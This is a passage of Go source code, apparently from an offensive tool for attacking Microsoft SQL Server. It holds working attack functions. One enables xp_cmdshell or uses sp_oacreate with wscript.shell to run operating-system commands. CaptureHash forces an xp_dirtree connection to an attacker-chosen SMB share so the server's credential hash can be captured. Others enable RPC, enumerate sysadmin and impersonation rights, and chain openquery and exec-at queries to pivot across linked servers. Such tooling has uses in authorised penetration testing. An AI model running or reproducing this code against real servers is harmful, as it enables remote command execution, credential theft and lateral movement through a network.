	cmdCtx, cmdCancel := context.WithTimeout(context.Background(), timeout)
	defer cmdCancel()
	_, err = sqlr.db.ExecContext(cmdCtx, fmt.Sprintf(`DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "%s"';`, cmd))
	return err
}

func (sqlr *Sqlr) ExecXpCmdShell(cmd string, timeout time.Duration) (string, error) {
	sqlr.CheckConnection()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	_, err := sqlr.db.ExecContext(ctx, enableXpCmdShell)
	if err != nil {
		return "", errors.Wrap(err, "Failed to enable xp_cmdshell")
	}

	cmdCtx, cmdCancel := context.WithTimeout(context.Background(), timeout)
	defer cmdCancel()
	var results string
	err = sqlr.db.QueryRowContext(cmdCtx, fmt.Sprintf(execXpCmdShellTemplate, cmd)).Scan(&results)
	if err != nil {
		return "", err
	}
	return results, nil
}

func (sqlr *Sqlr) CaptureHash(smbServer, smbShare string) error {
	sqlr.CheckConnection()
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	_, err := sqlr.db.ExecContext(ctx, fmt.Sprintf(`EXEC master..xp_dirtree "\\%s\%s";`, smbServer, smbShare))
	return err
}

func (sqlr *Sqlr) EnableRpc(target string) error {
	sqlr.CheckConnection()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	_, err := sqlr.db.ExecContext(ctx, fmt.Sprintf("exec sp_serveroption @server='%s', @optname='rpc', @optvalue='TRUE'", target))
	return err
}

func (sqlr *Sqlr) Query(query string, timeout time.Duration) error {
	sqlr.CheckConnection()
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	rows, err := sqlr.db.QueryContext(ctx, query)
	if err != nil {
		return errors.Wrap(err, "Failed to query server")
	}
	defer rows.Close()

	cols, err := rows.Columns()
	if err != nil {
		return errors.Wrap(err, "Failed to get column names")
	}
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader(cols)
	table.SetCenterSeparator("|")

	for rows.Next() {
		refs := make([]interface{}, len(cols))
		results := make([]string, len(cols))
		for i := range refs {
			refs[i] = &results[i]
		}
		if err := rows.Scan(refs...); err != nil {
			return errors.Wrap(err, "Error reading values")
		}
		table.Append(results)
	}
	if err := rows.Err(); err != nil {
		return errors.Wrap(err, "Failed to retrieve results of query")
	}

	table.Render()
	return nil
}

func (sqlr *Sqlr) EnumLocal() {
	sqlr.CheckConnection()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	var version string
	err := sqlr.db.QueryRowContext(ctx, queryVersion).Scan(&version)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query server version")
		version = "Unknown"
	}

	var login string
	err = sqlr.db.QueryRowContext(ctx, queryLogin).Scan(&login)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query system user")
		login = "Unknown"
	}

	var username string
	err = sqlr.db.QueryRowContext(ctx, queryUsername).Scan(&username)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query SQL user name")
		username = "Unknown"
	}

	var publicRole bool
	err = sqlr.db.QueryRowContext(ctx, queryPublicRole).Scan(&publicRole)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query public role")
	}

	var sysadminRole bool
	err = sqlr.db.QueryRowContext(ctx, querySysadminRole).Scan(&sysadminRole)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query sysadmin role")
	}

	var databases []string
	rows, err := sqlr.db.QueryContext(ctx, queryListDatabases)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query for databases")
	} else {
		defer rows.Close()
		for rows.Next() {
			var database string
			if err := rows.Scan(&database); err != nil {
				log.Error().Err(err).Msg("Error reading database")
			} else {
				databases = append(databases, database)
			}
		}
		if err := rows.Err(); err != nil {
			log.Error().Err(err).Msg("Failed to retrieve databases")
		}
	}

	var impersonations []string
	rows, err = sqlr.db.QueryContext(ctx, queryImpersonation)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query for allowed impersonations")
	} else {
		defer rows.Close()
		for rows.Next() {
			var impersonation string
			if err := rows.Scan(&impersonation); err != nil {
				log.Error().Err(err).Msg("Error reading impersonation")
			} else {
				impersonations = append(impersonations, impersonation)
			}
		}
		if err := rows.Err(); err != nil {
			log.Error().Err(err).Msg("Failed to retrieve allowed impersonations")
		}
	}

	var links []string
	rows, err = sqlr.db.QueryContext(ctx, execLinked)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query for linked servers")
	} else {
		defer rows.Close()
		for rows.Next() {
			var link1, link2, link3, link4, link5, link6, link7 sql.NullString
			if err := rows.Scan(&link1, &link2, &link3, &link4, &link5, &link6, &link7); err != nil {
				log.Error().Err(err).Msg("Error reading linked server")
			} else {
				if !strings.Contains(link1.String, "SQLEXPRESS") {
					links = append(links, link1.String)
				}
			}
		}
		if err := rows.Err(); err != nil {
			log.Error().Err(err).Msg("Failed to retrieve linked servers")
		}
	}

	fmt.Println("Server version:", version)
	fmt.Printf("Login: %s (%s)\n", login, username)
	if publicRole {
		fmt.Println("User is a member of public role")
	} else {
		fmt.Println("User is NOT a member of public role")
	}
	if sysadminRole {
		fmt.Println("User is a member of sysadmin role")
	} else {
		fmt.Println("User is NOT a member of sysadmin role")
	}
	fmt.Println("Discovered databases:", strings.Join(databases, ", "))
	fmt.Println("Logins that can be impersonated:", strings.Join(impersonations, ", "))
	fmt.Println("Linked SQL servers:", strings.Join(links, ", "))
}

func (sqlr *Sqlr) EnumLink(chain []string) {
	sqlr.CheckConnection()
	timeout := 60 * time.Second

	version, err := sqlr.queryLinkStringResult(queryVersion, chain, timeout, false)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query linked server version")
		version = "Unknown"
	}

	login, err := sqlr.queryLinkStringResult(queryLogin, chain, timeout, false)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query linked system user")
		login = "Unknown"
	}

	username, err := sqlr.queryLinkStringResult(queryUsername, chain, timeout, false)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query linked SQL user name")
		username = "Unknown"
	}

	publicRole, err := sqlr.queryLinkBoolResult(queryPublicRole, chain, timeout, false)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query linked public role")
	}

	sysadminRole, err := sqlr.queryLinkBoolResult(querySysadminRole, chain, timeout, false)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query linked sysadmin role")
	}

	databases, err := sqlr.execLinkStringsResult(queryListDatabases, chain, timeout)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query for databases")
	}

	impersonations, err := sqlr.execLinkStringsResult(queryImpersonation, chain, timeout)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query for linked allowed impersonations")
	}

	_links, err := sqlr.execLinkStrings7Result(execLinked, chain, timeout)
	if err != nil {
		log.Error().Err(err).Msg("Failed to query for double linked servers")
	}
	var links []string
	for _, link := range _links {
		if !strings.Contains(link, "SQLEXPRESS") {
			links = append(links, link)
		}
	}

	fmt.Println("Server version:", version)
	fmt.Printf("Login: %s (%s)\n", login, username)
	if publicRole {
		fmt.Println("User is a member of public role")
	} else {
		fmt.Println("User is NOT a member of public role")
	}
	if sysadminRole {
		fmt.Println("User is a member of sysadmin role")
	} else {
		fmt.Println("User is NOT a member of sysadmin role")
	}
	fmt.Println("Discovered databases:", strings.Join(databases, ", "))
	fmt.Println("Logins that can be impersonated:", strings.Join(impersonations, ", "))
	fmt.Println("Linked SQL servers:", strings.Join(links, ", "))
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randString(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func reverseChain(chain []string) {
	for i, j := 0, len(chain)-1; i < j; i, j = i+1, j-1 {
		chain[i], chain[j] = chain[j], chain[i]
	}
}

func (sqlr *Sqlr) prepareLinkQuery(query string, chain []string, includesAlias bool) string {
	// Add alias if needed
	alias := randString(10)
	if !includesAlias {
		query += " as " + alias
	}

	// reverse the chain
	reverseChain(chain)

	// Prepare layered query
	for _, link := range chain {
		query = fmt.Sprintf(`select %s from openquery("%s", '%s')`, alias, link, strings.ReplaceAll(query, "'", "''"))
	}

	// re-reverse the chain
	reverseChain(chain)

	return query
}

func (sqlr *Sqlr) prepareLinkExec(stmt string, chain []string) string {
	// reverse the chain
	reverseChain(chain)

	// Prepare layered query
	for _, link := range chain {
		stmt = fmt.Sprintf(`exec ('%s') at "%s"`, strings.ReplaceAll(stmt, "'", "''"), link)
	}

	// re-reverse the chain
	reverseChain(chain)

	return stmt
}

func (sqlr *Sqlr) queryLinkStringResult(query string, chain []string, timeout time.Duration, includesAlias bool) (string, error) {
	query = sqlr.prepareLinkQuery(query, chain, includesAlias)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	var val string
	err := sqlr.db.QueryRowContext(ctx, query).Scan(&val)
	if err != nil {
		return "", errors.Wrap(err, "Failed to query linked server")
	}

	return val, nil
}

func (sqlr *Sqlr) queryLinkBoolResult(query string, chain []string, timeout time.Duration, includesAlias bool) (bool, error) {
	query = sqlr.prepareLinkQuery(query, chain, includesAlias)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	var val bool
	err := sqlr.db.QueryRowContext(ctx, query).Scan(&val)
	if err != nil {
		return false, errors.Wrap(err, "Failed to query linked server")
	}

	return val, nil
}

func (sqlr *Sqlr) execLinkStringsResult(stmt string, chain []string, timeout time.Duration) ([]string, error) {
	stmt = sqlr.prepareLinkExec(stmt, chain)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	rows, err := sqlr.db.QueryContext(ctx, stmt)
	if err != nil {
		return nil, errors.Wrap(err, "Failed to query linked server")
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var val string
		if err := rows.Scan(&val); err != nil {
			return nil, errors.Wrap(err, "Error reading values")
		}
		results = append(results, val)
	}
	if err := rows.Err(); err != nil {
		return nil, errors.Wrap(err, "Failed to retrieve results of query")
	}
	return results, nil
}

func (sqlr *Sqlr) execLinkStrings7Result(stmt string, chain []string, timeout time.Duration) ([]string, error) {
	stmt = sqlr.prepareLinkExec(stmt, chain)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	rows, err := sqlr.db.QueryContext(ctx, stmt)
	if err != nil {
		return nil, errors.Wrap(err, "Failed to query linked server")
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var val1, val2, val3, val4, val5, val6, val7 sql.NullString
		if err := rows.Scan(&val1, &val2, &val3, &val4, &val5, &val6, &val7); err != nil {
			return nil, errors.Wrap(err, "Error reading values")
		}
		results = append(results, val1.String)
	}
	if err := rows.Err(); err != nil {
		return nil, errors.Wrap(err, "Failed to retrieve results of query")
	}
	return results, nil
}
